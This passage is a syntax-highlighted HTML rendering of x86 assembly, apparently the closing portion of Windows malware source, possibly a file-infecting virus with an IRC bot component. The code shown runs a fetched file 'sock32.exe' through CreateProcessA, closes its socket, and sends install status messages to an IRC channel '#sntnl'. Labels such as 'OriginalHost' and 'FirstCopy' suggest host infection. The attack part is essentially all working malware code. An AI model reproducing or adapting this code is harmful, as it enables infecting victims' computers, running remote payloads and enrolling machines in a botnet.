    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InstallerCloseSocket</span><span class="sc0">
 
    </span><span class="sc5">ExecuteFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpProcessInformation</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpStartupInfo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CREATE_DEFAULT_ERROR_MODE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpThreadAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpProcessAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">commandline</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACreateProcess</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">installer_launchstatus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

    </span><span class="sc5">InstallerCloseSocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">isocketh</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Aclosesocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AWSACleanup</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETWAPI</span><span class="sc0">

    </span><span class="sc5">ExitInstaller</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
   
</span><span class="sc5">INSTALLER_THREAD</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FALSE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc5">lpProcessInformation</span><span class="sc0">        </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">lpStartupInfo</span><span class="sc0">           </span><span class="sc5">STARTUPINFO</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">lpThreadAttributes</span><span class="sc0">      </span><span class="sc5">SECURITY_ATTRIBUTES</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">lpProcessAttributes</span><span class="sc0">         </span><span class="sc5">SECURITY_ATTRIBUTES</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">mysocket2</span><span class="sc0">           </span><span class="sc5">SOCKADDR</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">

    </span><span class="sc5">AWriteFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WriteFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACreateProcess</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateProcessA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGlobalAlloc</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    

    </span><span class="sc5">commandline</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"sock32.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">windir</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">skip</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">sizestart</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">sizesize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">bytesread</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">nrbytes2</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">dmHnd</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ifilehandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ifilesize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">irealsize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">isocketh</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">installerthreadid</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">installer_server</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">installer_get</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">installer_serversize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">installer_getsize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">installer_launchstatus</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">installer_stat00</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PRIVMSG #sntnl :Waiting..."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">installer_stat01</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PRIVMSG #sntnl :Installing..."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">installer_stat02</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PRIVMSG #sntnl :Done..."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">installer_stat03</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PRIVMSG #sntnl :Unable to connect..."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc5">installer_stat04</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PRIVMSG #sntnl :Size error..."</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

</span><span class="sc5">GET_WINDIR</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">GetWindowsDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">128h</span><span class="sc0">                   </span><span class="sc1">; size of dirstring     </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; save it here</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetWindowsDirectory</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; get windowsdir</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GET_WINDIR</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SET_WINDIR</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">SetWindowsDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">windir</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; change to sysdir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SET_WINDIR</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;========================================================================;</span><span class="sc0">

    </span><span class="sc5">Leap</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

    </span><span class="sc5">OriginalHost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">FirstCopy</span><span class="sc0">
</span><span class="sc5">end</span></div></body>
</html>
